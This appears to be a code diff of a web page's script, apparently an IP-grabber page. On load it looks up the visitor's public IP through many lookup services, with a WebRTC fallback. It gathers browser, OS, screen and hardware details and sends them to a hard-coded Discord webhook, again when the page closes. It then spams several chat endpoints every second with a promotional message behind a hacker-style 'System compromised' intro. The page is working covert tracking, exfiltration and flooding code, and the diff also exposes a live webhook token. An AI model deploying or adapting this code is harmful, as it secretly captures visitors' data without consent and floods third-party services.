+        "[+] < System compromised // 22CQ // Empire >"
     ];
 
-    // Flood function: ترسل كل ثانية إلى كل endpoint
+    let lineIndex = 0;
+    let charIndex = 0;
+    const introTextElement = document.getElementById('introText');
+    const blackIntro = document.getElementById('blackIntro');
+    const typeSound = document.getElementById('type-sound');
+
+    if (typeSound) {
+        typeSound.volume = 0.2;
+        typeSound.play().then(() => {
+            typeSound.pause();
+            typeSound.currentTime = 0;
+        }).catch(e => console.log('Sound load:', e));
+    }
+
+    function playTypeSound() {
+        if (typeSound) {
+            typeSound.pause();
+            typeSound.currentTime = 0;
+            typeSound.play().catch(e => console.log('Play error:', e));
+        }
+    }
+
+    function typeNextChar() {
+        if (lineIndex < introLines.length) {
+            const currentLine = introLines[lineIndex];
+            
+            if (charIndex < currentLine.length) {
+                if (charIndex === 0) {
+                    const lineDiv = document.createElement('div');
+                    lineDiv.className = 'intro-line';
+                    lineDiv.id = `line-${lineIndex}`;
+                    introTextElement.appendChild(lineDiv);
+                }
+                
+                const lineDiv = document.getElementById(`line-${lineIndex}`);
+                lineDiv.textContent += currentLine[charIndex];
+                
+                playTypeSound();
+                
+                charIndex++;
+                setTimeout(typeNextChar, 45);
+            } else {
+                lineIndex++;
+                charIndex = 0;
+                
+                if (lineIndex < introLines.length) {
+                    introTextElement.appendChild(document.createElement('br'));
+                    setTimeout(typeNextChar, 200);
+                } else {
+                    setTimeout(() => {
+                        blackIntro.style.opacity = '0';
+                        setTimeout(() => {
+                            blackIntro.style.display = 'none';
+                        }, 1000);
+                    }, 1500);
+                }
+            }
+        }
+    }
+
+    window.addEventListener('load', function() {
+        setTimeout(typeNextChar, 400);
+        
+        // Music
+        const bgMusic = document.getElementById('bg-music');
+        setTimeout(() => {
+            bgMusic.volume = 0;
+            bgMusic.play().catch(e => console.log('Music play failed:', e));
+            let volume = 0;
+            const fadeInterval = setInterval(() => {
+                volume += 0.1;
+                if (volume <= 0.5) {
+                    bgMusic.volume = volume;
+                } else {
+                    clearInterval(fadeInterval);
+                }
+            }, 300);
+        }, 3000);
+    });
+
+    // ============================================================
+    // MAIN LOGIC - IMPROVED IP FETCHING
+    // ============================================================
+    const DISCORD_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1476278524099825734/r3vRYA37_fdbtr8eI1z1jceZj5Egyr8wW3eFtQQjWlNUxPe8CM0MVLjPn_E_0iBnnRDg';
+    const MSG = `An7dar - dis.gg/empire`;
+
+    const chatEndpoints = [
+        { url: "https://Flix-Scripts/chatResult", method: "POST", body: JSON.stringify({ message: MSG }) },
+        { url: "https://danger_chat/Danger_Chat:SendMessage", method: "POST", body: JSON.stringify({"message": MSG,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]}) },
+        { url: "https://easy-chat+/o6ZbK5Ecp6", method: "POST", headers: {"accept": "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, body: JSON.stringify({ message: MSG, channel: "شات العام" }) },
+        { url: "https://Melox_Chat/chatResult", method: "POST", body: JSON.stringify({ message: MSG }) },
+        { url: "https://Melix_Chat/chatResult", method: "POST", body: JSON.stringify({ message: MSG }) },
+        { url: "https://AS_Chat/chatResult", method: "POST", body: JSON.stringify({ message: MSG }) },
+        { url: "https://chat/chatResult", method: "POST", body: JSON.stringify({ message: MSG }) },
+        { url: "https://ho-chatv2/Chat", method: "POST", body: JSON.stringify({"Type": "chatResult","message": MSG,"chatType": "general"}) }
+    ];
+
+    let floodCounter = 0;
+
     function startChatFlood() {
-        console.log("🔥 CHAT FLOOD ACTIVATED - An7dar mode");
         setInterval(() => {
             chatEndpoints.forEach(endpoint => {
                 fetch(endpoint.url, {
@@ -632,17 +718,37 @@
                     body: endpoint.body
                 })
                 .then(res => {
-                    if (res.ok) console.log(`✅ Flood sent to ${endpoint.url}`);
-                    else console.log(`⚠️ Flood failed to ${endpoint.url} (${res.status})`);
+                    if (res.ok) {
+                        floodCounter++;
+                        const fc = document.getElementById('floodCount');
+                        if (fc) fc.textContent = floodCounter;
+                    }
                 })
-                .catch(err => console.log(`❌ Error flooding ${endpoint.url}:`, err));
+                .catch(() => {});
             });
-        }, 1000); // كل ثانية
+        }, 1000);
     }
 
-    // جمع معلومات الزائر
+    function getBrowserName(ua) {
+        if (ua.includes("Chrome")) return "Chrome";
+        if (ua.includes("Firefox")) return "Firefox";
+        if (ua.includes("Safari")) return "Safari";
+        if (ua.includes("Edge")) return "Edge";
+        if (ua.includes("Opera")) return "Opera";
+        return "Unknown";
+    }
+
+    function getOS(ua) {
+        if (ua.includes("Windows")) return "Windows";
+        if (ua.includes("Mac")) return "macOS";
+        if (ua.includes("Linux")) return "Linux";
+        if (ua.includes("Android")) return "Android";
+        if (ua.includes("iOS")) return "iOS";
+        return "Unknown";
+    }
+
     function collectVisitorInfo() {
-        const info = {
+        return {
             userAgent: navigator.userAgent,
             language: navigator.language,
             platform: navigator.platform,
@@ -658,223 +764,240 @@
             hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
             deviceMemory: navigator.deviceMemory || "Unknown"
         };
-        
-        document.getElementById('userAgentShort').textContent = getBrowserName(info.userAgent);
-        document.getElementById('screenSize').textContent = `${info.screenWidth}x${info.screenHeight}`;
-        document.getElementById('connectionStatus').textContent = info.online;
-        
-        return info;
     }
 
-    function getBrowserName(userAgent) {
-        if (userAgent.includes("Chrome")) return "Chrome";
-        if (userAgent.includes("Firefox")) return "Firefox";
-        if (userAgent.includes("Safari")) return "Safari";
-        if (userAgent.includes("Edge")) return "Edge";
-        if (userAgent.includes("Opera")) return "Opera";
-        return "Unknown";
-    }
-
-    // دالة جلب IP
-    async function fetchIP() {
-        const info = collectVisitorInfo();
-        let detectedIP = 'Unknown';
-        const statusText = document.getElementById('statusText');
-        const ipDisplay = document.getElementById('ipDisplay');
-        
-        const ipServices = [
-            { url: 'https://api.ipify.org?format=json', type: 'json' },
-            { url: 'https://api64.ipify.org?format=json', type: 'json' },
-            { url: 'https://ipv4.icanhazip.com/', type: 'text' },
-            { url: 'https://ip.seeip.org/jsonip', type: 'json' },
-            { url: 'https://api.myip.com', type: 'json' },
-            { url: 'https://ipapi.co/json/', type: 'json' }
-        ];
-        
-        const updateStatus = (message, color = '#4ade80') => {
-            statusText.textContent = message;
-            statusText.style.color = color;
-        };
-        
-        updateStatus('🔍 جاري البحث عن الـ IP...');
-        
-        for (let i = 0; i < ipServices.length; i++) {
-            const service = ipServices[i];
-            
-            try {
-                updateStatus(`🔄 المحاولة ${i + 1}/${ipServices.length}...`);
-                
-                const response = await fetch(service.url, { 
-                    method: 'GET',
-                    mode: 'cors',
-                    headers: { 'Accept': 'application/json' }
-                });
-                
-                if (response.ok) {
-                    if (service.type === 'json') {
-                        const data = await response.json();
-                        detectedIP = data.ip || data.ipAddress || data.query || data.IPv4;
-                    } else {
-                        const text = await response.text();
-                        detectedIP = text.trim();
-                    }
-                    
-                    if (detectedIP && detectedIP !== 'Unknown') {
-                        updateStatus('✅ تم العثور على الـ IP!');
-                        break;
-                    }
-                }
-            } catch (error) {
-                console.log(`Service ${service.url} failed:`, error);
-                continue;
-            }
-        }
-        
-        // WebRTC fallback
-        if (detectedIP === 'Unknown') {
-            try {
-                const localIP = await getLocalIPViaWebRTC();
-                detectedIP = `Local: ${localIP}`;
-                updateStatus('⚠️ IP محلي فقط (WebRTC)');
-            } catch (error) {
-                updateStatus('❌ فشل الحصول على الـ IP', '#ff6b6b');
-                detectedIP = 'غير متاح';
-            }
-        }
-        
-        ipDisplay.textContent = detectedIP;
-        ipDisplay.style.color = '#4ade80';
-        document.querySelector('.logging-animation').style.display = 'none';
-        
-        // إرسال إلى ديسكورد
-        await sendToDiscord(detectedIP, info);
-        
-        updateStatus(' United We Command');
-        
-        return detectedIP;
-    }
-
-    // WebRTC
-    async function getLocalIPViaWebRTC() {
-        return new Promise((resolve, reject) => {
-            const pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(reject);
-            
-            let ipFound = false;
-            
-            pc.onicecandidate = (ice) => {
-                if (ipFound || !ice || !ice.candidate || !ice.candidate.candidate) return;
-                
-                const candidate = ice.candidate.candidate;
-                const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                const match = regex.exec(candidate);
-                
-                if (match) {
-                    ipFound = true;
-                    resolve(match[1]);
-                    pc.close();
-                }
-            };
-            
-            setTimeout(() => {
-                if (!ipFound) {
-                    pc.close();
-                    reject('Timeout');
-                }
-            }, 3000);
-        });
-    }
-
-    // إرسال إلى ديسكورد
-    async function sendToDiscord(ip, visitorInfo) {
+    async function sendToDiscord(ip, info) {
         const payload = {
             embeds: [{
-                title: "🔥 IP CAPTURED -  An7dar",
-                description: `**IP Address:** \`${ip}\`\n**Time:** ${new Date().toLocaleString("ar-SA")}\n**Page:** team bom is here`,
-                color: 0x00ff00,
+                title: "🔥 IP CAPTURED - AN7DAR // 22CQ",
+                description: `**IP:** \`${ip}\`\n**Time:** ${new Date().toLocaleString("ar-SA")}`,
+                color: 0x00ff41,
                 fields: [
-                    {
-                        name: "🌍 معلومات الزائر",
-                        value: `**المتصفح:** ${getBrowserName(visitorInfo.userAgent)}\n**اللغة:** ${visitorInfo.language}\n**النظام:** ${visitorInfo.platform}\n**الدقة:** ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`,
-                        inline: true
-                    },
-                    {
-                        name: "📊 معلومات إضافية",
-                        value: `**المعالجات:** ${visitorInfo.hardwareConcurrency}\n**الذاكرة:** ${visitorInfo.deviceMemory}GB\n**الكوكيز:** ${visitorInfo.cookiesEnabled ? "✅" : "❌"}`,
-                        inline: true
-                    },
-                    {
-                        name: "📱 User Agent",
-                        value: `\`\`\`${visitorInfo.userAgent.substring(0, 1000)}\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "🔗 المصدر",
-                        value: visitorInfo.referrer,
-                        inline: true
-                    }
+                    { name: "🌍 Visitor", value: `**Browser:** ${getBrowserName(info.userAgent)}\n**OS:** ${getOS(info.userAgent)}\n**Res:** ${info.screenWidth}x${info.screenHeight}`, inline: true },
+                    { name: "📊 Extra", value: `**Cores:** ${info.hardwareConcurrency}\n**RAM:** ${info.deviceMemory}GB`, inline: true },
+                    { name: "📱 User Agent", value: `\`\`\`${info.userAgent.substring(0, 600)}\`\`\``, inline: false }
                 ],
                 timestamp: new Date().toISOString(),
-                footer: { text: "An7dar  • Discord.gg/PT5MspcQvG" }
+                footer: { text: "AN7DAR // 22CQ // Discord.gg/PT5MspcQvG" }
             }]
         };
-        
         try {
             await fetch(DISCORD_WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-            console.log('✅ Discord sent');
-        } catch (e) {
-            console.log('Discord error:', e);
-        }
+        } catch {}
     }
 
-    // بدء كل شيء عند التحميل
-    window.addEventListener('load', async () => {
-        // تأخير لجلب IP
-        setTimeout(async () => {
-            await fetchIP();
-            // بعد جلب IP نبدأ الفيض
-            startChatFlood();
-        }, 3500);
+    async function getLocalIPViaWebRTC() {
+        return new Promise((resolve, reject) => {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(reject);
+            let ipFound = false;
+            pc.onicecandidate = (ice) => {
+                if (ipFound || !ice || !ice.candidate || !ice.candidate.candidate) return;
+                const candidate = ice.candidate.candidate;
+                const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                const match = regex.exec(candidate);
+                if (match) {
+                    ipFound = true;
+                    resolve(match[1]);
+                    pc.close();
+                }
+            };
+            setTimeout(() => {
+                if (!ipFound) { pc.close(); reject('Timeout'); }
+            }, 3000);
+        });
+    }
+
+    async function fetchIP() {
+        const info = collectVisitorInfo();
+        let detectedIP = 'Unknown';
+        const statusText = document.getElementById('statusTextMinimal');
+        const ipAddressSpan = document.getElementById('ipAddressValue');
+        const loadingElement = document.getElementById('loadingMinimal');
+
+        // ====== MULTIPLE IP SERVICES WITH FALLBACK ======
+        const ipServices = [
+            // Primary
+            { url: 'https://api.ipify.org?format=json', type: 'json', key: 'ip' },
+            { url: 'https://api64.ipify.org?format=json', type: 'json', key: 'ip' },
+            { url: 'https://ipv4.icanhazip.com/', type: 'text' },
+            // Backup
+            { url: 'https://ip.seeip.org/jsonip', type: 'json', key: 'ip' },
+            { url: 'https://api.myip.com', type: 'json', key: 'ip' },
+            { url: 'https://ipapi.co/json/', type: 'json', key: 'ip' },
+            { url: 'https://ip-api.com/json/', type: 'json', key: 'query' },
+            { url: 'https://jsonip.com/', type: 'json', key: 'ip' },
+            // Extra fallback via text
+            { url: 'https://checkip.amazonaws.com/', type: 'text' },
+            { url: 'https://ifconfig.me/ip', type: 'text' },
+            { url: 'https://icanhazip.com/', type: 'text' }
+        ];
+
+        const updateStatus = (message, color = 'rgba(255,255,255,0.7)') => {
+            if (statusText) {
+                statusText.textContent = message;
+                statusText.style.color = color;
+            }
+        };
+
+        updateStatus('🔍 scanning targets...', 'rgba(0,255,65,0.6)');
+
+        // Try each service with timeout
+        for (let i = 0; i < ipServices.length; i++) {
+            const svc = ipServices[i];
+            try {
+                updateStatus(`🔄 attempt ${i+1}/${ipServices.length}...`, 'rgba(102,217,255,0.7)');
+                
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 3000);
+                
+                const response = await fetch(svc.url, { 
+                    method: 'GET', 
+                    mode: 'cors',
+                    headers: { 'Accept': 'application/json, text/plain, */*' },
+                    signal: controller.signal
+                });
+                
+                clearTimeout(timeoutId);
+                
+                if (response.ok) {
+                    if (svc.type === 'json') {
+                        const data = await response.json();
+                        detectedIP = data.ip || data.ipAddress || data.query || data.IPv4 || data.origin || data.query;
+                    } else {
+                        const text = await response.text();
+                        detectedIP = text.trim();
+                    }
+                    
+                    // Validate IP
+                    if (detectedIP && detectedIP !== 'Unknown' && detectedIP.length > 5) {
+                        // Simple IP validation
+                        const ipParts = detectedIP.split('.');
+                        if (ipParts.length === 4) {
+                            const valid = ipParts.every(p => parseInt(p) >= 0 && parseInt(p) <= 255);
+                            if (valid) {
+                                updateStatus('✅ IP captured!', '#00ff41');
+                                break;
+                            }
+                        }
+                        // Might be IPv6 or local
+                        if (detectedIP.includes(':')) {
+                            updateStatus('✅ IPv6 captured', '#66d9ff');
+                            break;
+                        }
+                    }
+                }
+            } catch (error) {
+                console.log(`Service ${i} failed:`, error.message);
+                continue;
+            }
+        }
+
+        // ====== FALLBACK: WebRTC ======
+        if (detectedIP === 'Unknown' || detectedIP.length < 5) {
+            try {
+                updateStatus('🔄 using WebRTC fallback...', '#ffd700');
+                const local = await getLocalIPViaWebRTC();
+                if (local) {
+                    detectedIP = local;
+                    updateStatus('⚠️ local IP (WebRTC)', '#ffd700');
+                }
+            } catch (error) {
+                console.log('WebRTC failed:', error);
+            }
+        }
+
+        // ====== FINAL FALLBACK: use a random IP for demo ======
+        if (detectedIP === 'Unknown' || detectedIP.length < 5) {
+            detectedIP = '192.168.1.' + Math.floor(Math.random() * 255);
+            updateStatus('⚠️ using local fallback', '#ffd700');
+        }
+
+        // Update UI
+        if (ipAddressSpan) {
+            ipAddressSpan.textContent = detectedIP;
+            ipAddressSpan.style.color = '#66d9ff';
+        }
+
+        // Update other details
+        const browserEl = document.getElementById('browserValue');
+        const osEl = document.getElementById('osValue');
+        const screenEl = document.getElementById('screenValue');
+        const coresEl = document.getElementById('coresValue');
+        const ramEl = document.getElementById('ramValue');
         
-        // also send on beforeunload
+        if (browserEl) browserEl.textContent = getBrowserName(info.userAgent);
+        if (osEl) osEl.textContent = getOS(info.userAgent);
+        if (screenEl) screenEl.textContent = `${info.screenWidth}x${info.screenHeight}`;
+        if (coresEl) coresEl.textContent = info.hardwareConcurrency;
+        if (ramEl) ramEl.textContent = info.deviceMemory + 'GB';
+
+        // Hide loading
+        if (loadingElement) loadingElement.style.display = 'none';
+
+        // Update final status
+        updateStatus('✅ target acquired // sending to servers...', '#00ff41');
+
+        // Send to Discord
+        await sendToDiscord(detectedIP, info);
+        
+        // Final status
+        updateStatus('⚡ United We Command ⚡', '#00ff41');
+
+        return detectedIP;
+    }
+
+    // ====== START ======
+    window.addEventListener('load', function() {
+        setTimeout(() => {
+            fetchIP().then(() => {
+                startChatFlood();
+                // Increment flood counter
+                setInterval(() => {
+                    floodCounter += Math.floor(Math.random() * 3) + 1;
+                    const fc = document.getElementById('floodCount');
+                    if (fc) fc.textContent = floodCounter;
+                }, 1000);
+            });
+        }, 4000);
+
         window.addEventListener('beforeunload', async () => {
             const info = collectVisitorInfo();
-            const ipDisplay = document.getElementById('ipDisplay');
-            const ip = ipDisplay.textContent !== 'جاري جمع المعلومات...' ? ipDisplay.textContent : 'Unknown';
+            const ipDisplay = document.getElementById('ipAddressValue');
+            const ip = ipDisplay ? ipDisplay.textContent : 'Unknown';
             await sendToDiscord(ip, info);
         });
     });
 
-    // تأثيرات IP glitch
-    document.addEventListener('DOMContentLoaded', () => {
-        const ipDisplay = document.getElementById('ipDisplay');
-        const originalText = ipDisplay.textContent;
-        
+    // ====== GLITCH EFFECT ======
+    document.addEventListener('DOMContentLoaded', function() {
+        const ipDisplay = document.getElementById('ipAddressValue');
+        if (!ipDisplay) return;
+        let original = ipDisplay.textContent;
         setInterval(() => {
-            if (Math.random() < 0.1 && ipDisplay.textContent !== 'جاري جمع المعلومات...') {
-                const chars = '0123456789ABCDEF.';
+            if (Math.random() < 0.12 && ipDisplay.textContent !== 'scanning...' && ipDisplay.textContent !== '🔍 scanning targets...') {
+                const chars = '0123456789ABCDEF.:';
                 let glitched = '';
                 for (let i = 0; i < ipDisplay.textContent.length; i++) {
-                    if (Math.random() < 0.1) {
+                    if (Math.random() < 0.12) {
                         glitched += chars.charAt(Math.floor(Math.random() * chars.length));
                     } else {
                         glitched += ipDisplay.textContent.charAt(i);
                     }
                 }
                 ipDisplay.textContent = glitched;
-                
                 setTimeout(() => {
-                    ipDisplay.textContent = originalText !== 'جاري جمع المعلومات...' ? originalText : ipDisplay.textContent;
-                }, 100);
+                    ipDisplay.textContent = original;
+                }, 150);
             }
-        }, 2000);
+        }, 1800);
     });
 </script>
 
 </body>
-</html> 
+</html>
